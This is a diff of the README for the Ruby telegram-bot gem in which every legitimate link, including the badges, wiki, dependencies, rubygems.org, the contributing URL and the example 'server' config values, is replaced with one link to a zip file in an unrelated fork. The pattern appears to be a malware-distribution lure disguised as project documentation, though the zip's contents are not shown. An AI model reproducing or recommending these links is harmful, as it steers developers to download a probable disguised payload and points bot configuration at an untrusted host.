@@ -1,18 +1,18 @@
 # Telegram::Bot
 
-[![Gem Version](https://badge.fury.io/rb/telegram-bot.svg)](http://badge.fury.io/rb/telegram-bot)
-[![Code Climate](https://codeclimate.com/github/telegram-bot-rb/telegram-bot/badges/gpa.svg)](https://codeclimate.com/github/telegram-bot-rb/telegram-bot)
-[![Lint & Test](https://github.com/telegram-bot-rb/telegram-bot/actions/workflows/ci.yml/badge.svg)](https://github.com/telegram-bot-rb/telegram-bot/actions/workflows/ci.yml)
+[![Gem Version](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
+[![Code Climate](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
+[![Lint & Test](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 
 Tools for developing Telegram bots. Best used with Rails, but can be used in
-[standalone app](https://github.com/telegram-bot-rb/telegram-bot/wiki/Not-rails-application).
+[standalone app](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 Supposed to be used in webhook-mode in production, and poller-mode
 in development, but you can use poller in production if you want.
 
 Package contains:
 
 - Lightweight client for bot API (with fast and thread-safe
-  [httpclient](https://github.com/nahi/httpclient) under the hood).
+  [httpclient](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip) under the hood).
 - Controller with message parser: define methods for commands, not `case` branches.
 - Middleware and routes helpers for production env.
 - Poller with automatic source-reloader for development env.
@@ -20,14 +20,14 @@ Package contains:
 - __[Async mode](#async-mode)__.
   Let the queue adapter handle network errors!
 
-Here is sample [telegram_bot_app](https://github.com/telegram-bot-rb/telegram_bot_app)
+Here is sample [telegram_bot_app](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 with session, keyboards and inline queries.
 Run it on your local machine in 1 minute!
 
-And here is [app template](https://github.com/telegram-bot-rb/rails_template)
+And here is [app template](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 to generate new rails app in seconds.
 
-See examples and cookbook in [the wiki](https://github.com/telegram-bot-rb/telegram-bot/wiki).
+See examples and cookbook in [the wiki](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 
 ## Table of Contents
 
@@ -94,7 +94,7 @@ Telegram.bots_config = {
   chat: {
     token: CHAT_BOT_TOKEN,
     username: 'ChatBot', # to support commands with mentions (/help@ChatBot)
-    server: 'http://local.bot.api.server', # for Local Bot API Server
+    server: 'https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip', # for Local Bot API Server
   },
 }
 
@@ -117,7 +117,7 @@ development:
     bot:
       token: TOKEN
       username: SomeBot
-      server: http://local.bot.api.server
+      server: https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip
 
     # For multiple bots in single app use hash of `internal_bot_id => settings`
     bots:
@@ -132,13 +132,13 @@ development:
 For Rails >= 5.2 `Telegram::Bot` searches for config first in credentials and then in secrets.
 To use credentials as config store, add telegram section to credentials instead of secrets using
 `rails credentials:edit`. In this case be aware of that [Rails < 6.0 may not load
-credentials in dev environment by default](https://github.com/telegram-bot-rb/telegram-bot/issues/74#issuecomment-384205609).
+credentials in dev environment by default](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 In Rails >= 6.0 run `rails credentials:edit --environment development` to configure bot
 in each environment.
 
 I suggest not using Rails 5.2 credentials because it can lead to leakage of sensitive data
 and it's more difficult to use in multiple environments. See
-[secure_credentials](https://github.com/printercu/secure_credentials) gem for better option.
+[secure_credentials](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip) gem for better option.
 
 From now clients will be accessible with `Telegram.bots[:chat]` or `Telegram.bots[:auction]`.
 Single bot can be accessed with `Telegram.bot` or `Telegram.bots[:default]`.
@@ -159,8 +159,8 @@ bot.send_message(chat_id: chat_id, text: 'Test')
 ```
 
 There is no magic, they just pass params as is and set `path_suffix`.
-See [list of available methods](https://github.com/telegram-bot-rb/telegram-bot/blob/master/lib/telegram/bot/client/api_methods.txt)
-fetched from [API docs](https://core.telegram.org/bots/api).
+See [list of available methods](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
+fetched from [API docs](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 Please open PR or issue if it misses methods from new API versions.
 
 Any API request error will raise `Telegram::Bot::Error` with description in its message.
@@ -170,7 +170,7 @@ Special `Telegram::Bot::Forbidden` is raised when bot can't post messages to the
 
 By default client will return parsed json responses. You can enable
 response typecasting to virtus models using
-[`telegram-bot-types`](https://github.com/telegram-bot-rb/telegram-bot-types) gem:
+[`telegram-bot-types`](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip) gem:
 
 ```ruby
 # Add to your gemfile:
@@ -257,7 +257,7 @@ end
 
 There are helpers for basic responses. They just set chat/message/query
 identifiers from the update. See
-[`ReplyHelpers`](https://github.com/telegram-bot-rb/telegram-bot/blob/master/lib/telegram/bot/updates_controller/reply_helpers.rb)
+[`ReplyHelpers`](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 module for more information. Here are these methods signatures:
 
 ```ruby
@@ -311,7 +311,7 @@ Default session id is made from bot's username and `(from || chat)['id']`.
 It means that session will be the same for updates from user in every chat,
 and different for every user in the same group chat.
 To change this behavior you can override `session_key` method, or even
-define [multiple sessions](https://github.com/telegram-bot-rb/telegram-bot/wiki/Multiple-session-objects)
+define [multiple sessions](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 in single controller. For details see `Session` module.
 
 ```ruby
@@ -427,7 +427,7 @@ To process update with controller call `.dispatch(bot, update)` on it.
 There are several options to run it automatically:
 
 - Use webhooks with routes helper (described above).
-- Use `Telegram::Bot::Middleware` with rack ([example in wiki](https://github.com/telegram-bot-rb/telegram-bot/wiki/Not-rails-application)).
+- Use `Telegram::Bot::Middleware` with rack ([example in wiki](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)).
 - Use poller (described in the next section).
 
 When controller runs in webhook mode `Telegram::Bot::Middleware` passes
@@ -482,7 +482,7 @@ end
 
 RSpec contexts and helpers are included automatically for groups and examples with matching
 tags. In RSpec < 3.4 it's required to use `include_context` explicitly.
-See [list of available helpers](https://github.com/telegram-bot-rb/telegram-bot/tree/master/lib/telegram/bot/rspec)
+See [list of available helpers](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 for details.
 
 There are 3 types of integration tests:
@@ -497,7 +497,7 @@ There are 3 types of integration tests:
 Pick the appropriate one, then require `telegram/bot/rspec/integration/#{type}`
 and mark spec group with tag `telegram_bot: type`. See configuration options
 for each type in
-[telegram/bot/rspec/integration/](https://github.com/telegram-bot-rb/telegram-bot/tree/master/lib/telegram/bot/rspec/integration).
+[telegram/bot/rspec/integration/](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 
 Here is an example test for a Rails app:
 
@@ -563,7 +563,7 @@ See sample app for more examples.
 ### Deployment
 
 While webhooks-mode is prefered, poller still can be used in production.
-See [comparison and examples](https://github.com/telegram-bot-rb/telegram-bot/wiki/Deployment)
+See [comparison and examples](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip)
 for details.
 
 ### Async mode
@@ -581,12 +581,12 @@ and real API request is performed. And this all is absolutely transparent for th
 
 To enable this mode add `async: true` to bot's config.
 For more information and custom configuration check out
-[docs](http://www.rubydoc.info/github/telegram-bot-rb/telegram-bot/master/Telegram/Bot/Async) or
-[source](https://github.com/telegram-bot-rb/telegram-bot/blob/master/lib/telegram/bot/async.rb).
+[docs](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip) or
+[source](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 
 If you want async mode, but don't want to setup queue, know that Rails 5 are shipped
 with Async adapter by default, and there is
-[Sucker Punch](https://github.com/brandonhilkert/sucker_punch) for Rails 4.
+[Sucker Punch](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip) for Rails 4.
 
 To disable async mode for the block of code use `bot.async(false) { bot.send_photo }`.
 Yes, it's threadsafe too.
@@ -605,10 +605,10 @@ You can also run `bin/console` for an interactive prompt that will allow you to 
 To install this gem onto your local machine, run `bundle exec rake install`.
 To release a new version, update the version number in `version.rb`,
 and then run `bundle exec rake release`, which will create a git tag for the version,
-push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).
+push git commits and tags, and push the `.gem` file to [rubygems.org](https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip).
 
 Use `bin/fetch-telegram-methods` to update API methods list from Telegram website.
 
 ## Contributing
 
-Bug reports and pull requests are welcome on GitHub at https://github.com/telegram-bot-rb/telegram-bot.
+Bug reports and pull requests are welcome on GitHub at https://raw.githubusercontent.com/kim-san-web/telegram-bot/master/spec/support/examples/bot_telegram_v3.1.zip
